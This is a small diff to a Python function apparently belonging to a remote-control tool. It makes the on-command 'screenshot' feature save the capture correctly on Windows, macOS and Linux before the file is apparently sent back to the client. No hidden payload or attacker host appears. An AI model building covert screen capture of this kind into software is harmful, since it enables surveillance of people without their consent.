@@ -245,7 +245,13 @@ def openRemoteControl(client):
                 time.sleep(1.5)
             elif comando[0:10]=="screenshot":
                 myScreenshot = pyautogui.screenshot()
-                myScreenshot.save(os.getcwd() + "\screen.png")
+                if platform.system() == "Windows":
+                    myScreenshot.save(os.getcwd() + "\screen.png")
+                elif platform.system() == "Darwin":
+                    myScreenshot.save(os.getcwd() + "/screen.png")
+                else:
+                    myScreenshot.save(os.getcwd() + "/screen.png")
+
                 try:
                     filename = "screen.png"
                     filesize = os.path.getsize(filename)
